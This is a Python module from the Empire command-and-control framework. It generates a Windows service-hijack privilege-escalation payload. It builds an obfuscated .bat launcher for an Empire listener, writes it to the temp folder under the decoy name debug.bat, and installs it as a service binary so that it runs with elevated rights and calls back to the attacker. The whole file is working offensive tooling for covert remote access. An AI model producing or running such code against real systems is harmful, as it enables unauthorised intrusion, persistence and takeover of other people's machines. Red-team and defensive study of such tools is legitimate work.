from empire.server.common.empire import MainMenu
from empire.server.core.module_models import EmpireModule
from empire.server.utils.module_util import handle_error_message


class Module:
    @staticmethod
    def generate(
        main_menu: MainMenu,
        module: EmpireModule,
        params: dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
    ):
        # read in the common module source code
        script, err = main_menu.modulesv2.get_module_source(
            module_name=module.script_path,
            obfuscate=obfuscate,
            obfuscate_command=obfuscation_command,
        )

        if err:
            return handle_error_message(err)

        service_name = params["ServiceName"]

        # # get just the code needed for the specified function
        # script = helpers.generate_dynamic_powershell_script(moduleCode, "Write-ServiceEXECMD")

        # generate the .bat launcher code to write out to the specified location
        launcher = main_menu.stagertemplatesv2.new_instance("windows_launcher_bat")
        launcher.options["Listener"]["Value"] = params["Listener"]
        launcher.options["UserAgent"]["Value"] = params["UserAgent"]
        launcher.options["Proxy"]["Value"] = params["Proxy"]
        launcher.options["ProxyCreds"]["Value"] = params["ProxyCreds"]
        launcher.options["ObfuscateCommand"]["Value"] = params["ObfuscateCommand"]
        launcher.options["Obfuscate"]["Value"] = params["Obfuscate"]
        launcher.options["Bypasses"]["Value"] = params["Bypasses"]
        if params["Delete"].lower() == "true":
            launcher.options["Delete"] = "True"
        else:
            launcher.options["Delete"] = "False"

        launcher_code = launcher.generate()

        # PowerShell code to write the launcher.bat out
        script_end = ';$tempLoc = "$env:temp\\debug.bat"'
        script_end += '\n$batCode = @"\n' + launcher_code + '"@\n'
        script_end += "$batCode | Out-File -Encoding ASCII $tempLoc ;\n"
        script_end += '"Launcher bat written to $tempLoc `n";\n'

        if launcher_code == "":
            return handle_error_message("[!] Error in launcher .bat generation.")

        script_end += (
            '\nInstall-ServiceBinary -ServiceName "'
            + str(service_name)
            + '" -Command "C:\\Windows\\System32\\cmd.exe /C $tempLoc"'
        )

        return main_menu.modulesv2.finalize_module(
            script=script,
            script_end=script_end,
            obfuscate=obfuscate,
            obfuscation_command=obfuscation_command,
        )
